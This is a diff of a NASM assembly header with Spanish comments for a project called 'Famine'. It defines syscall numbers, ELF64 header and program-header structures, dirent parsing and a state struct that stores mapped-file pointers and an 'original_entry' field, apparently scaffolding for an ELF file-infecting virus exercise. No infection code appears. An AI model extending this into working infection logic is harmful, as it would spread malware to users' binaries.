@@ -6,29 +6,33 @@
 %define SC_EXIT         60
 %define SC_FCHMOD       91
 %define SC_GETDENTS64   217
-%define SC_OPENAT       257      
+%define SC_OPENAT       257
 
+; open
 %define O_RDONLY        0x00000000
 %define	O_RDWR          0x00000002
 %define O_DIRECTORY     0x00010000
+
+; mmap
 %define PROT_READ       0x1
 %define PROT_WRITE      0x2
+%define MAP_SHARED      0x02
 
 ; Para dirent (Regular file)
-%define DT_REG        8 
+%define DT_REG        8
 
-; el st-mode de la fstat struct (144 bytes) indica el tipo de fichero y los permisos. 
+; el st-mode de la fstat struct (144 bytes) indica el tipo de fichero y los permisos.
 ; Está a +24 bytes del inicio de la struct
 ; los bytes alto son los del tipo de fichero
 ; los bytes bajos son los permisos
-; 
+;
 ; Para calcular el tipo de fichero se hace AND sobre 0o170000(S_IFMT) sobre st-mode
 ; y en nuestro caso, se compara con 0o100000(S_IFREG) para regular file
 ; https://manpages.ubuntu.com/manpages/xenial/es/man2/stat.2.html
-%define S_IFMT      0o170000 
-%define S_IFREG     0o100000   
+%define S_IFMT      0o170000
+%define S_IFREG     0o100000
 
-%define MAGIC_NUMBERS   0x464c457f
+%define MAGIC_NUMBERS   0x464c457f ; little endian
 
 
 struc	dirent
@@ -39,7 +43,7 @@ struc	dirent
     .d_name		resb	1	; Filename
 endstruc ; OJO el typo de fichero está al final, en el último byte del registro. 8 para ficheros regulares
 
-struc	elf64_ehdr
+struc	Elf64_Ehdr
     .e_ident		resb	16	; Magic number and other info
     .e_type			resw	1	; Object file type
     .e_machine		resw	1	; Architecture
@@ -56,7 +60,7 @@ struc	elf64_ehdr
     .e_shstrndx		resw	1	; Section header string table index
 endstruc
 
-struc	elf64_phdr
+struc	Elf64_Phdr
     .p_type			resd	1	; Segment type
     .p_flags		resd	1	; Segment flags
     .p_offset		resq	1	; Segment file offset
@@ -67,14 +71,14 @@ struc	elf64_phdr
     .p_align		resq	1	; Segment alignment
 endstruc
 
-struc famine
+struc Famine
     .fd_dir             resq    1
     .fd_file            resq    1
     .dirent_struc       resb    1024
     .dir_name_pointer   resq    1
     .file_original_len  resd    1
     .mmap_pointer       resq    1
-    .original_entry     resq    1 
+    .original_entry     resq    1
 endstruc
 
 
@@ -96,18 +100,18 @@ endstruc
     pop rax
 %endmacro
 
-%define VAR(n) [(rbp - famine_size) + n]
+%define VAR(n) [(rbp - Famine_size) + n]
 ; Esto es para poder acceder a los valores de la stack donde se va almacenar la struc faime
 ; |             |
 ; |             |
 ; --------------- <- rsp
-; --------------- 
-; |             | 
-; | Famine      | 
-; | Struct      |   
-; | Data        |   
+; ---------------
 ; |             |
-; | .fd_dir     | <--- VAR(Data) ej: mov rax, VAR(famine.fd_dir)
+; | Famine      |
+; | Struct      |
+; | Data        |
+; |             |
+; | .fd_dir     | <--- VAR(Data) ej: mov rax, VAR(Famine.fd_dir)
 ; |             |
 ; |             |
 ; |             |
